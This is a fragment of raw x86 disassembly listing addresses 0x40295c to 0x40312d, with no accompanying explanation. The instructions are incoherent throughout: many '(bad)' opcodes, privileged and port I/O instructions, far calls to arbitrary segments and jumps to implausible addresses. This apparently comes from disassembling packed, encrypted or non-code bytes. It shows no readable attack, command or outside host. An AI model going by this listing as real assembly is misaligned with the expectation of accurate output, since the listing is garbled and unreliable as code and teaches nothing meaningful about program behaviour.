  40295c:	jbe    0x4029d2
  40295e:	loop   0x4029a1
  402960:	pushf  
  402961:	ins    BYTE PTR es:[edi],dx
  402962:	mov    ecx,0x3e33c754
  402967:	inc    esp
  402968:	rcr    BYTE PTR [edi+0x56],0x75
  40296c:	push   0x6c851ff4
  402971:	pushf  
  402972:	lahf   
  402973:	out    0x61,al
  402975:	push   edx
  402976:	add    ebx,DWORD PTR [ebx-0x662e46b4]
  40297c:	dec    esp
  40297d:	enter  0x3f0a,0x3
  402981:	call   0xadc07102
  402986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402987:	aas    
  402988:	mov    ah,0xca
  40298a:	pop    edi
  40298b:	jg     0x402943
  40298d:	mov    ds:0xf2072328,eax
  402992:	iret   
  402993:	ins    DWORD PTR es:[edi],dx
  402994:	adc    DWORD PTR [esi-0x16],ebx
  402997:	pop    ebp
  402998:	pop    es
  402999:	fcmovnbe st,st(2)
  40299b:	xor    eax,0x1b27d318
  4029a0:	inc    edx
  4029a1:	cmc    
  4029a2:	retf   0x3365
  4029a5:	pop    ss
  4029a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029a7:	ja     0x402a1f
  4029a9:	mov    al,0x94
  4029ab:	jmp    0xb6df660
  4029b0:	sub    al,0x75
  4029b2:	jle    0x40298d
  4029b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029b5:	cmp    esi,DWORD PTR [ecx+0x6e]
  4029b8:	mov    ch,0x48
  4029ba:	je     0x4029dd
  4029bc:	shl    bh,cl
  4029be:	and    al,0x90
  4029c0:	push   cs
  4029c1:	mov    al,ds:0xa1d234d0
  4029c6:	bound  ecx,QWORD PTR [edx]
  4029c8:	fs pushf 
  4029ca:	aas    
  4029cb:	icebp  
  4029cc:	pusha  
  4029cd:	(bad)  
  4029cf:	inc    edi
  4029d0:	push   esp
  4029d1:	pop    es
  4029d2:	cdq    
  4029d3:	mov    eax,0xa417f113
  4029d8:	and    al,0xb7
  4029da:	jmp    DWORD PTR [edx+ebx*8+0x28]
  4029de:	jmp    0x402a53
  4029e0:	pop    es
  4029e1:	mov    eax,0x4c2f6387
  4029e6:	nop
  4029e7:	cmp    cl,BYTE PTR [edi+0x6c]
  4029ea:	mov    esi,0xadbcc7f4
  4029ef:	ds scas al,BYTE PTR es:[edi]
  4029f1:	push   ds
  4029f2:	popa   
  4029f3:	mov    ebp,DWORD PTR [esi+0x63609c52]
  4029f9:	mov    edi,0x84dd9697
  4029fe:	mov    DWORD PTR [ecx-0x61],edx
  402a01:	xor    al,0xd0
  402a03:	cmc    
  402a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a05:	push   esi
  402a06:	xchg   edi,eax
  402a07:	push   ss
  402a08:	dec    edi
  402a09:	ins    DWORD PTR es:[edi],dx
  402a0a:	jmp    0x4029b5
  402a0c:	push   ss
  402a0d:	inc    esp
  402a0e:	cmp    DWORD PTR [ebp-0x7239f40e],edx
  402a14:	xchg   esi,eax
  402a15:	fsub   QWORD PTR [esi]
  402a17:	repz jnp 0x4029dd
  402a1a:	(bad)  
  402a1d:	inc    edi
  402a1e:	mov    ds:0x8374e69f,al
  402a23:	in     al,0xa9
  402a25:	adc    ebp,DWORD PTR [ebp+0x528e83b1]
  402a2b:	arpl   di,dx
  402a2d:	(bad)  
  402a2f:	(bad)  
  402a30:	ss jnp 0x402aaf
  402a33:	push   edx
  402a34:	out    0xea,al
  402a36:	jge    0x4029f5
  402a38:	and    al,0x94
  402a3a:	mov    al,0x3c
  402a3c:	push   eax
  402a3d:	dec    ecx
  402a3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a3f:	pop    esp
  402a40:	popa   
  402a41:	cli    
  402a42:	push   DWORD PTR [ecx-0x41d48193]
  402a48:	call   0x6e8b:0x7394af4a
  402a4f:	imul   ecx,DWORD PTR [esi+0x7b],0xffffff90
  402a53:	mov    al,0xa2
  402a55:	hlt    
  402a56:	call   FWORD PTR [ecx-0x21]
  402a59:	daa    
  402a5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a5b:	(bad)  
  402a5c:	mov    edx,0x5d5fe5d1
  402a61:	bnd js 0x402a34
  402a64:	mov    eax,ds:0xda547b71
  402a69:	adc    BYTE PTR [esi+0x11],ah
  402a6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a6e:	or     DWORD PTR [edi+esi*8-0x43056bf3],esi
  402a75:	nop
  402a76:	mov    al,0x9c
  402a78:	mov    DWORD PTR [esi+0x6c9ae67e],0xa46fabc0
  402a82:	add    eax,0x6c4af97a
  402a87:	push   ss
  402a88:	mov    ss,WORD PTR [edx+edx*8+0x3b]
  402a8c:	dec    esp
  402a8d:	push   ss
  402a8e:	dec    ebx
  402a8f:	lock loope 0x402a8a
  402a92:	out    dx,eax
  402a93:	popf   
  402a94:	xor    al,0xc
  402a96:	(bad)  
  402a97:	and    DWORD PTR [edx+0x329780f5],esp
  402a9d:	rcl    BYTE PTR [esi],cl
  402a9f:	mov    ds:0x1016f80f,eax
  402aa4:	ss loope 0x402b00
  402aa7:	int    0xc4
  402aa9:	imul   edx,DWORD PTR [eax-0x7ead9151],0xf5a44259
  402ab3:	dec    ebp
  402ab4:	dec    esp
  402ab5:	(bad)  
  402ab6:	cmp    DWORD PTR [ebx+ebp*1-0x5d],eax
  402aba:	test   al,0xd7
  402abc:	repz fild QWORD PTR ds:0x1194ff83
  402ac3:	daa    
  402ac4:	shl    BYTE PTR [ebx],cl
  402ac6:	addr16 cwde 
  402ac8:	popa   
  402ac9:	repz icebp 
  402acb:	push   ss
  402acc:	xor    edx,DWORD PTR [ebx]
  402ace:	movd   mm6,DWORD PTR [edx+0x4b4b8570]
  402ad5:	(bad)
  402ad9:	loopne 0x402aa8
  402adb:	hlt    
  402adc:	lds    ebp,FWORD PTR [ebx+0x14c49c92]
  402ae2:	test   dl,0xae
  402ae5:	pop    edx
  402ae6:	test   BYTE PTR [ebx+ebx*4-0x2c649a6e],al
  402aed:	inc    ecx
  402aee:	sbb    al,0x7d
  402af0:	mov    eax,ds:0x611f7cbc
  402af5:	push   ds
  402af6:	and    al,0xd0
  402af8:	out    0x4e,eax
  402afa:	push   ds
  402afb:	out    0xc8,al
  402afd:	adc    bh,cl
  402aff:	ret    
  402b00:	test   BYTE PTR [edx],cl
  402b02:	pop    esp
  402b03:	dec    ebp
  402b04:	pop    ebp
  402b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b06:	aas    
  402b07:	sar    BYTE PTR [edx-0x22],0x93
  402b0b:	push   ds
  402b0c:	push   ebp
  402b0d:	cmp    eax,0xd47c98b9
  402b12:	jl     0x402b51
  402b14:	and    edi,DWORD PTR [edi+0x2a8a155d]
  402b1a:	mov    ebp,0xe5e7d7b6
  402b1f:	push   es
  402b20:	push   esp
  402b21:	jne    0x402b98
  402b23:	inc    edi
  402b24:	pop    edi
  402b25:	cmp    al,ch
  402b27:	and    edi,DWORD PTR [ecx+0x3b]
  402b2a:	in     eax,0xcd
  402b2c:	mov    ecx,0xc4f07195
  402b31:	dec    esp
  402b32:	sub    DWORD PTR [ebx+0x22a55004],0xe
  402b39:	push   esp
  402b3a:	loopne 0x402ae6
  402b3c:	push   ss
  402b3d:	inc    esp
  402b3e:	xchg   DWORD PTR [di-0x5f29],ecx
  402b43:	js     0x402b4d
  402b45:	pop    ss
  402b46:	scas   al,BYTE PTR es:[edi]
  402b47:	jl     0x402b8d
  402b49:	inc    edx
  402b4a:	das    
  402b4b:	adc    eax,DWORD PTR [edx]
  402b4d:	pop    ebx
  402b4e:	and    al,0x77
  402b50:	pop    edx
  402b51:	ss jmp 0x402b0f
  402b54:	shr    DWORD PTR [ebp+ecx*2-0x35],cl
  402b58:	xor    ch,BYTE PTR [esi-0xd71b2d2]
  402b5e:	loope  0x402baa
  402b60:	fwait
  402b61:	or     DWORD PTR [edx-0x80],edx
  402b64:	popf   
  402b65:	jp     0x402af1
  402b67:	xlat   BYTE PTR ds:[ebx]
  402b68:	out    dx,eax
  402b69:	or     ah,BYTE PTR [ecx-0x39cc1dc9]
  402b6f:	dec    edi
  402b70:	aas    
  402b71:	pop    es
  402b72:	xor    DWORD PTR [ebp-0x31abf1cb],edx
  402b78:	sbb    esp,DWORD PTR [ebx+0x462e6edd]
  402b7e:	sub    eax,0x6d351237
  402b83:	adc    ah,0x6c
  402b86:	fidivr WORD PTR [edx+0x1458aeb7]
  402b8c:	mov    eax,0xc3d4d301
  402b91:	icebp  
  402b92:	fnstcw WORD PTR [edx+ebx*8+0x629e8ba6]
  402b99:	gs shl esp,1
  402b9c:	loope  0x402bbb
  402b9e:	mov    ebp,eax
  402ba0:	(bad)  
  402ba1:	fsubr  DWORD PTR [edx-0xf]
  402ba4:	test   BYTE PTR [ecx+0x759a75e4],ah
  402baa:	dec    edi
  402bab:	sbb    al,BYTE PTR [ebx+eiz*2]
  402bae:	mov    ah,0x8
  402bb0:	fsub   DWORD PTR [ebx+edi*8+0x25]
  402bb4:	mov    ch,0xa8
  402bb6:	mov    eax,0xe25b3133
  402bbb:	jae    0x402b71
  402bbd:	mov    al,ds:0x8f7ea3db
  402bc2:	xchg   esp,eax
  402bc3:	xchg   ebx,eax
  402bc4:	je     0x402be0
  402bc6:	or     edx,DWORD PTR [edi]
  402bc8:	repnz cli 
  402bca:	push   ss
  402bcb:	xor    ecx,DWORD PTR [edi-0x10]
  402bce:	inc    edx
  402bcf:	xor    BYTE PTR [edi+0x4c18b85e],dh
  402bd5:	push   esp
  402bd6:	sar    DWORD PTR [ecx-0x4],1
  402bd9:	fs xor al,0x41
  402bdc:	fwait
  402bdd:	gs xor al,0x63
  402be0:	jge    0x402b69
  402be2:	xchg   esp,eax
  402be3:	mov    ebx,0x2e428a28
  402be8:	adc    bh,BYTE PTR [ebx]
  402bea:	mov    BYTE PTR [edx],cl
  402bec:	or     eax,0x4f9bc5c4
  402bf1:	pop    eax
  402bf2:	add    BYTE PTR [edx],dh
  402bf4:	sub    DWORD PTR [edx+0x9],ebp
  402bf7:	mov    al,0x2b
  402bf9:	les    ebx,FWORD PTR [ecx+0x32a80f04]
  402bff:	sub    BYTE PTR [ecx-0x27],bl
  402c02:	popf   
  402c03:	push   0xffffffd6
  402c05:	mov    ds:0xc7aae090,al
  402c0a:	(bad)  
  402c0b:	push   ecx
  402c0c:	xchg   ebp,eax
  402c0d:	jae    0x402c81
  402c0f:	ins    BYTE PTR es:[edi],dx
  402c10:	loop   0x402be5
  402c12:	mov    ecx,0xfef63c3a
  402c17:	cmp    DWORD PTR ss:[esi+0x4e],edi
  402c1b:	mov    ch,0xd
  402c1d:	fsubr  QWORD PTR [eax-0x4e]
  402c20:	ja     0x402ba7
  402c22:	mov    BYTE PTR [edx],ch
  402c24:	sub    al,0x0
  402c26:	fist   DWORD PTR [ecx]
  402c28:	or     eax,0x427b21bd
  402c2d:	clc    
  402c2e:	xor    al,0xd6
  402c30:	dec    edx
  402c31:	mov    edx,DWORD PTR [edi+eax*4+0x7486c0ff]
  402c38:	cli    
  402c39:	call   0x2a191a39
  402c3e:	mov    ?,WORD PTR [esi+0x1451edf]
  402c44:	mov    ah,0x82
  402c46:	cwde   
  402c47:	icebp  
  402c48:	cdq    
  402c49:	jmp    0x9c9b8a86
  402c4e:	dec    ecx
  402c4f:	xchg   DWORD PTR [ecx-0x5b],ebx
  402c52:	sub    DWORD PTR [esi-0x62],esi
  402c55:	or     eax,0x91702d86
  402c5a:	rcr    DWORD PTR es:[esi-0x22],1
  402c5e:	inc    esi
  402c5f:	sbb    cl,BYTE PTR [edi]
  402c61:	std    
  402c62:	das    
  402c63:	add    BYTE PTR [ebx-0x627fea7d],ah
  402c69:	cwde   
  402c6a:	in     eax,0x63
  402c6c:	adc    al,0xb7
  402c6e:	clc    
  402c6f:	pusha  
  402c70:	push   esi
  402c71:	stos   DWORD PTR es:[edi],eax
  402c72:	mul    BYTE PTR [edi+0x3da70e0]
  402c78:	dec    ecx
  402c79:	je     0x402c56
  402c7b:	push   ebp
  402c7c:	mov    bl,0x13
  402c7e:	sbb    eax,0xc5e9493b
  402c83:	add    DWORD PTR [eax],esi
  402c85:	fcomp  QWORD PTR [edx-0x5b1fba5a]
  402c8b:	or     dl,BYTE PTR [esi]
  402c8d:	cld    
  402c8e:	mov    ds:0x42162eb,eax
  402c93:	fnstenv [ebx*1+0x4c75dbfc]
  402c9a:	rcl    BYTE PTR [edi],cl
  402c9c:	mov    dh,0x0
  402c9e:	xchg   ecx,eax
  402c9f:	scas   eax,DWORD PTR es:[edi]
  402ca0:	and    BYTE PTR [ebp-0x42],dh
  402ca3:	xor    dh,al
  402ca5:	cmp    eax,0xf55bedd3
  402caa:	mov    edi,0x1fb85c25
  402caf:	in     eax,0x80
  402cb1:	cmc    
  402cb2:	fisttp QWORD PTR [ecx-0x1fbb7eed]
  402cb8:	push   ss
  402cb9:	into   
  402cba:	fs xor eax,0xfa966f56
  402cc0:	mov    eax,ds:0xecba9132
  402cc5:	mov    es,WORD PTR [edx+0x6edd2f3d]
  402ccb:	pop    ebx
  402ccc:	loope  0x402cec
  402cce:	inc    eax
  402ccf:	and    ebp,ecx
  402cd1:	xchg   dh,cl
  402cd3:	jmp    0x402d10
  402cd5:	aam    0x6b
  402cd7:	push   esi
  402cd8:	dec    edi
  402cd9:	mov    ch,BYTE PTR [ebx]
  402cdb:	stos   BYTE PTR es:[edi],al
  402cdc:	mov    ebp,0x20d6a5e4
  402ce1:	in     al,0x8c
  402ce3:	dec    ebp
  402ce4:	imul   edx,DWORD PTR [ebx+0x4676a217],0x25832f8a
  402cee:	sar    BYTE PTR [edi],1
  402cf0:	out    0xdc,eax
  402cf2:	lahf   
  402cf3:	nop
  402cf4:	cmp    ebx,ecx
  402cf6:	and    esp,DWORD PTR [ecx-0x60]
  402cf9:	sbb    BYTE PTR [esi+0x2c248694],bh
  402cff:	or     DWORD PTR [edi],ecx
  402d01:	ror    DWORD PTR [ebx+0x3f4dac2e],cl
  402d07:	data16 fwait
  402d09:	add    bh,BYTE PTR [ebx]
  402d0b:	or     al,0x1b
  402d0d:	push   ebp
  402d0e:	push   ds
  402d0f:	push   0x889f7af2
  402d14:	sub    ch,BYTE PTR [ebp+0x8]
  402d17:	outs   dx,BYTE PTR ds:[esi]
  402d18:	jae    0x402cce
  402d1a:	iret   
  402d1b:	xchg   ecx,eax
  402d1c:	inc    ebp
  402d1d:	cmp    eax,0x6521fbf5
  402d22:	push   0x37
  402d24:	mov    ds:0xc4aa588b,eax
  402d29:	jo     0x402cd7
  402d2b:	call   0x92de655f
  402d30:	jmp    0x402d3a
  402d32:	loop   0x402ce0
  402d34:	inc    eax
  402d35:	xor    al,0x9f
  402d37:	cmp    al,0x3e
  402d39:	int    0x36
  402d3b:	jo     0x402d04
  402d3d:	mov    al,ds:0xa93439c2
  402d42:	xchg   edi,eax
  402d43:	push   es
  402d44:	adc    eax,0x5c0f8c50
  402d49:	iret   
  402d4a:	call   0x8aa8:0x7400dde8
  402d51:	jmp    0x8fa9:0x4d1161df
  402d58:	test   al,0x4c
  402d5a:	ins    BYTE PTR es:[edi],dx
  402d5b:	ins    DWORD PTR es:[edi],dx
  402d5c:	sub    DWORD PTR [ecx-0x17],eax
  402d5f:	and    DWORD PTR [ebx+0x90a6318],ecx
  402d65:	inc    esi
  402d66:	or     al,0xa9
  402d68:	jnp    0x402d9f
  402d6a:	push   ss
  402d6b:	(bad)  
  402d6c:	mov    DWORD PTR [ebx],esi
  402d6e:	and    al,0xf1
  402d70:	sbb    eax,0xd1bf6a09
  402d75:	mov    ds:0xa8733c9e,eax
  402d7a:	and    DWORD PTR [ecx-0x16075205],ecx
  402d80:	cdq    
  402d81:	xchg   ecx,eax
  402d82:	jmp    0x402db9
  402d84:	call   0x7627:0x9021410a
  402d8b:	xlat   BYTE PTR ds:[ebx]
  402d8c:	xchg   DWORD PTR [esi-0x67fb7f6e],ebp
  402d92:	mov    WORD PTR [ebx+ecx*8-0x1b],cs
  402d96:	or     al,ah
  402d98:	push   ss
  402d99:	pop    esp
  402d9a:	jmp    DWORD PTR ds:0xde436fec
  402da0:	sbb    dl,BYTE PTR [eax+0x37]
  402da3:	call   0x4dff:0xfdcefbf4
  402daa:	in     al,0x61
  402dac:	jp     0x402e2d
  402dae:	sub    ah,BYTE PTR [eax-0x71]
  402db1:	call   0x289c:0xbe471c6
  402db8:	sti    
  402db9:	rcr    BYTE PTR [ebx+0x6f],cl
  402dbc:	jecxz  0x402de7
  402dbe:	xchg   edx,eax
  402dbf:	jnp    0x402d74
  402dc1:	dec    ecx
  402dc2:	test   BYTE PTR [edx+eiz*1],cl
  402dc5:	call   0xa9b64589
  402dca:	jne    0x402e23
  402dcc:	or     eax,ebp
  402dce:	cmp    esi,DWORD PTR [ebp-0x15]
  402dd1:	xor    DWORD PTR [ebx-0x5be42e32],esp
  402dd7:	fwait
  402dd8:	ret    0x1e4
  402ddb:	test   al,0xaa
  402ddd:	xchg   ebp,eax
  402dde:	mov    eax,ds:0xf8b3b442
  402de3:	mov    BYTE PTR [ecx+ebp*1-0x2f],0x43
  402de8:	push   ebp
  402de9:	adc    BYTE PTR [ecx+0x7bfe345],cl
  402def:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402df0:	scas   eax,DWORD PTR es:[edi]
  402df1:	mov    bl,0x41
  402df3:	pop    es
  402df4:	imul   eax,DWORD PTR [edx+ebp*8],0xe7db8b60
  402dfb:	js     0x402e4b
  402dfd:	inc    eax
  402dfe:	aaa    
  402dff:	cld    
  402e00:	cmp    al,0x1f
  402e02:	pop    ebp
  402e03:	mov    ds:0xd0dbaf5,eax
  402e08:	into   
  402e09:	push   cs
  402e0a:	mov    ds:0x641e66e7,al
  402e0f:	loope  0x402dec
  402e11:	sbb    BYTE PTR gs:[edi+0x4c],ah
  402e15:	ret    0x5c06
  402e18:	sbb    bl,BYTE PTR [edx-0x32]
  402e1b:	dec    edi
  402e1c:	mov    bl,BYTE PTR [edi+ebp*8+0x7c888721]
  402e23:	jo     0x402dde
  402e25:	sbb    esp,DWORD PTR [eax-0x5485da5]
  402e2b:	popa   
  402e2c:	repz xor DWORD PTR [ebx+0x7278f832],eax
  402e33:	repz jp 0x402db9
  402e36:	adc    BYTE PTR [esp+ebx*4-0x5d],0xa
  402e3b:	aam    0x17
  402e3d:	push   ds
  402e3e:	xor    ebx,ecx
  402e40:	lahf   
  402e41:	cmp    DWORD PTR [ebx],0xbaa2bdfc
  402e47:	scas   eax,DWORD PTR es:[edi]
  402e48:	add    ch,BYTE PTR [esi]
  402e4a:	imul   edi,DWORD PTR ds:0x347b1cd4,0xffffffd5
  402e51:	div    bh
  402e53:	outs   dx,DWORD PTR ds:[esi]
  402e54:	fistp  QWORD PTR [edx-0x28c535f]
  402e5a:	push   0x6e
  402e5c:	or     eax,eax
  402e5e:	jmp    0x402eb5
  402e60:	dec    edx
  402e61:	push   cs
  402e62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e63:	xchg   ebx,eax
  402e64:	test   DWORD PTR [edi+ecx*4-0x4c0723d],esp
  402e6b:	ds cmp eax,0x983fabe9
  402e71:	and    ah,BYTE PTR [ecx+0x42]
  402e74:	or     al,0x3e
  402e76:	sub    dh,al
  402e78:	sub    edi,edx
  402e7a:	mov    bl,0x75
  402e7c:	mov    WORD PTR [esi+0x5b],fs
  402e7f:	jge    0x402ebc
  402e81:	cld    
  402e82:	lahf   
  402e83:	(bad)  
  402e84:	icebp  
  402e85:	add    DWORD PTR [edi+0x65],0x2d44dbd6
  402e8c:	xor    DWORD PTR [ecx-0x4b],edx
  402e8f:	sub    ch,BYTE PTR [ebx-0x2cab90d]
  402e95:	sbb    ebp,DWORD PTR [edx]
  402e97:	lock mov WORD PTR ds:0x828520f6,?
  402e9e:	sahf   
  402e9f:	mov    ds,WORD PTR [ecx-0x1896e96f]
  402ea5:	add    ebp,ebx
  402ea7:	aad    0xb8
  402ea9:	bnd jle 0x402eeb
  402eac:	jns    0x402ebb
  402eae:	jl     0x402e34
  402eb0:	fsub   DWORD PTR [ebp-0x35e3c17d]
  402eb6:	mov    esi,0x59a48e71
  402ebb:	shl    DWORD PTR [esi+edx*4],cl
  402ebe:	adc    cl,dh
  402ec0:	adc    DWORD PTR [edx-0x62333071],ebx
  402ec6:	mov    esp,ebx
  402ec8:	xor    al,0x1
  402eca:	push   es
  402ecb:	xchg   esi,eax
  402ecc:	xlat   BYTE PTR ds:[ebx]
  402ecd:	mov    BYTE PTR [ecx],dl
  402ecf:	sbb    esi,edx
  402ed1:	gs jmp 0x402f40
  402ed4:	mov    bl,0x7f
  402ed6:	jp     0x402f47
  402ed8:	jnp    0x402e8b
  402eda:	repnz sbb DWORD PTR [edx-0xc4c6026],edi
  402ee1:	pop    ebp
  402ee2:	out    dx,eax
  402ee3:	cmp    bh,BYTE PTR [eax+0x4681d564]
  402ee9:	xchg   DWORD PTR [ecx+0x685d83b1],edi
  402eef:	cmp    esp,DWORD PTR [edx+edi*2-0x47cb15a6]
  402ef6:	push   0xffffffd9
  402ef8:	sbb    eax,0xbc9c96ee
  402efd:	jne    0x402ed1
  402eff:	scas   eax,DWORD PTR es:[edi]
  402f00:	jae    0x402ec6
  402f02:	lds    edi,FWORD PTR ss:[edx-0x52b6b9e5]
  402f09:	mov    ecx,0x7804df00
  402f0e:	push   esp
  402f0f:	adc    edx,DWORD PTR [ecx+0x1]
  402f12:	out    0xba,al
  402f14:	xor    ch,ah
  402f16:	jnp    0x402f73
  402f18:	mov    ah,0x8b
  402f1a:	add    bh,ch
  402f1c:	or     esp,edx
  402f1e:	fnstsw WORD PTR [ebp-0x7c85aa18]
  402f24:	or     cl,0xbc
  402f27:	sub    al,BYTE PTR [edx+edx*8]
  402f2a:	push   esi
  402f2b:	sub    DWORD PTR [ebp+ebp*4-0x609eab16],esi
  402f32:	lods   eax,DWORD PTR ds:[esi]
  402f33:	out    0x32,eax
  402f35:	inc    ebx
  402f36:	sub    eax,eax
  402f38:	leave  
  402f39:	add    al,0x54
  402f3b:	test   al,0x29
  402f3d:	dec    ebp
  402f3e:	lock mov dl,0xc7
  402f41:	stos   BYTE PTR es:[edi],al
  402f42:	mov    esp,0x4c9770ad
  402f47:	xor    edi,DWORD PTR [ecx+0x6829d6e1]
  402f4d:	(bad)  
  402f4e:	cld    
  402f4f:	jg     0x402fbd
  402f51:	dec    esi
  402f52:	sbb    al,0x11
  402f54:	pop    esp
  402f55:	and    al,0x1f
  402f57:	nop
  402f58:	inc    eax
  402f59:	scas   eax,DWORD PTR es:[edi]
  402f5a:	or     eax,0x2e73eaae
  402f5f:	(bad)
  402f63:	adc    eax,0x5123396
  402f68:	(bad)  [ebx]
  402f6a:	xchg   ecx,eax
  402f6b:	shl    BYTE PTR [ecx-0x5c],cl
  402f6e:	push   esp
  402f6f:	mov    esi,0x181c671f
  402f74:	xchg   ebx,eax
  402f75:	mov    ds:0xde913a9c,al
  402f7a:	xlat   BYTE PTR ds:[ebx]
  402f7b:	aaa    
  402f7c:	pop    esi
  402f7d:	(bad)  
  402f7e:	into   
  402f7f:	sub    DWORD PTR [edx],edi
  402f81:	mov    dh,BYTE PTR [ebp-0x2a]
  402f84:	dec    eax
  402f85:	repnz xor ah,BYTE PTR [ebx-0x642844ab]
  402f8c:	xchg   edx,eax
  402f8d:	lods   al,BYTE PTR ds:[esi]
  402f8e:	sbb    ebx,DWORD PTR [edi+edx*4]
  402f91:	iret   
  402f92:	leave  
  402f93:	loop   0x402fde
  402f95:	lods   eax,DWORD PTR ds:[esi]
  402f96:	shl    edi,0xa3
  402f99:	pop    edi
  402f9a:	mov    al,ds:0x91f716f0
  402f9f:	push   ds
  402fa0:	and    ch,BYTE PTR [edi-0x21ad45bf]
  402fa6:	pop    ss
  402fa7:	dec    edi
  402fa8:	cmp    al,0x5c
  402faa:	xor    al,0x1c
  402fac:	mov    al,0xd1
  402faf:	inc    esi
  402fb0:	mov    ds:0x965dafd5,al
  402fb5:	(bad)  
  402fb6:	mov    edx,0xa3d88bf8
  402fbb:	pop    ebx
  402fbc:	aaa    
  402fbd:	pop    ebx
  402fbe:	push   cs
  402fbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fc0:	sub    DWORD PTR [ebp+0x79],ebp
  402fc3:	push   edi
  402fc4:	test   al,0x4d
  402fc6:	fwait
  402fc7:	in     al,dx
  402fc8:	inc    edi
  402fc9:	aas    
  402fca:	inc    edx
  402fcb:	mov    cl,0xcf
  402fcd:	cdq    
  402fce:	xchg   esp,eax
  402fcf:	cmp    eax,0x89511ee0
  402fd4:	mov    ebx,0x94ae3ae5
  402fd9:	(bad)  
  402fda:	push   ss
  402fdb:	call   0x4813:0x57d65aef
  402fe2:	add    eax,0xfba56c49
  402fe7:	mul    DWORD PTR [eax+esi*8+0x7a]
  402feb:	scas   al,BYTE PTR es:[edi]
  402fec:	in     eax,0x72
  402fee:	or     al,0xb2
  402ff0:	adc    DWORD PTR [edi],esi
  402ff2:	inc    eax
  402ff3:	push   esp
  402ff4:	(bad)  
  402ff5:	int3   
  402ff6:	lods   al,BYTE PTR ds:[esi]
  402ff7:	xchg   ebp,eax
  402ff8:	sbb    ch,BYTE PTR [edi]
  402ffa:	out    0xe1,al
  402ffc:	aaa    
  402ffd:	daa    
  402ffe:	sbb    BYTE PTR [ebx],al
  403000:	repnz stc 
  403002:	add    BYTE PTR [ebx+eax*1-0x77ba037c],bh
  403009:	lods   eax,DWORD PTR ds:[esi]
  40300a:	nop
  40300b:	jmp    0xea7e:0x7874ff2e
  403012:	loop   0x402fff
  403014:	push   0x6d68b98a
  403019:	in     eax,0x99
  40301b:	mov    esp,0xf769db00
  403020:	aam    0x43
  403022:	cmc    
  403023:	imul   esi,DWORD PTR [edx+eiz*4+0x25],0xffffff9e
  403028:	and    al,0x11
  40302a:	and    al,0x9d
  40302c:	outs   dx,DWORD PTR ds:[esi]
  40302d:	icebp  
  40302e:	in     al,dx
  40302f:	(bad)  
  403030:	sbb    DWORD PTR [eax-0x16],esp
  403033:	loope  0x402ff3
  403035:	and    BYTE PTR [edx+0x6f0751d3],cl
  40303b:	mov    ecx,0xc48e34a4
  403040:	in     eax,0xc8
  403042:	sbb    eax,0xa61296af
  403047:	xor    esp,DWORD PTR [eax]
  403049:	out    0x90,eax
  40304b:	mov    edi,0x758e2652
  403050:	je     0x40300f
  403052:	aaa    
  403053:	fldenv [eax]
  403055:	jmp    0x520cf7a0
  40305a:	sub    al,0x99
  40305c:	int3   
  40305d:	imul   esi,DWORD PTR [edi+0x535afb3b],0x7ae9363b
  403067:	retf   
  403068:	pop    esi
  403069:	mov    ecx,0x969fdc7d
  40306e:	jp     0x4030be
  403070:	jmp    0x81edebb3
  403075:	jnp    0x40302e
  403077:	daa    
  403078:	xchg   esp,eax
  403079:	mov    WORD PTR [ebp-0x7a91a64],ss
  40307f:	sbb    eax,0xf5e55981
  403084:	add    dh,BYTE PTR [ebx]
  403086:	fwait
  403087:	mov    ecx,0x30eb39a0
  40308c:	out    0xe3,eax
  40308e:	mov    edx,0x8aeda14b
  403093:	xor    eax,0x53fa8e2d
  403098:	pop    es
  403099:	lds    esi,FWORD PTR [edx-0x67]
  40309c:	or     DWORD PTR [edi+edi*1-0x15],edi
  4030a0:	mov    esi,0xc4184f43
  4030a5:	sahf   
  4030a6:	cs in  al,0x22
  4030a9:	xlat   BYTE PTR ds:[ebx]
  4030aa:	jbe    0x403104
  4030ac:	mov    eax,0x6173886
  4030b1:	out    0xdf,eax
  4030b3:	add    BYTE PTR [esi],al
  4030b5:	cmp    eax,ecx
  4030b7:	fst    DWORD PTR [edx]
  4030b9:	pop    ds
  4030ba:	xchg   ebp,eax
  4030bb:	or     ah,BYTE PTR [ebp-0x6602ee82]
  4030c1:	pop    edi
  4030c2:	xchg   DWORD PTR [edx],ecx
  4030c4:	in     eax,dx
  4030c5:	push   esi
  4030c6:	aaa    
  4030c7:	inc    esi
  4030c8:	mov    cl,cl
  4030ca:	or     esp,DWORD PTR ds:0xfbf2595e
  4030d0:	mov    edi,0x96040fd2
  4030d5:	popa   
  4030d6:	dec    esp
  4030d7:	inc    ebp
  4030d8:	or     al,0x85
  4030da:	std    
  4030db:	mov    ecx,0x3a97a196
  4030e0:	push   ebp
  4030e1:	or     DWORD PTR [edx+0x62],eax
  4030e4:	mov    al,0x34
  4030e6:	in     al,0x20
  4030e8:	pusha  
  4030e9:	dec    esi
  4030ea:	cmp    DWORD PTR [ebp-0x37cd3241],esi
  4030f0:	stos   DWORD PTR es:[edi],eax
  4030f1:	jne    0x40308d
  4030f3:	lods   al,BYTE PTR ds:[esi]
  4030f4:	arpl   WORD PTR [edi+0x3facb9f5],dx
  4030fa:	test   BYTE PTR [ecx-0x3019a55d],dh
  403100:	sbb    eax,0x417a7549
  403105:	ins    BYTE PTR es:[edi],dx
  403106:	leave  
  403107:	aaa    
  403108:	call   0xe0cd3d32
  40310d:	mov    bh,0xd6
  40310f:	fwait
  403110:	xor    BYTE PTR [edx-0x2c150ab8],0xe4
  403117:	push   edi
  403118:	aaa    
  403119:	dec    ecx
  40311a:	xchg   edi,eax
  40311b:	dec    edi
  40311c:	cli    
  40311d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40311e:	jbe    0x4030f4
  403120:	sbb    BYTE PTR [ebp+0x1e],bh
  403123:	lahf   
  403124:	xor    DWORD PTR [ecx+edx*8+0x3a],edx
  403128:	scas   al,BYTE PTR es:[edi]
  403129:	xor    DWORD PTR [esi+0x30],0x25
  40312d:	stos   BYTE PTR es:[edi],al
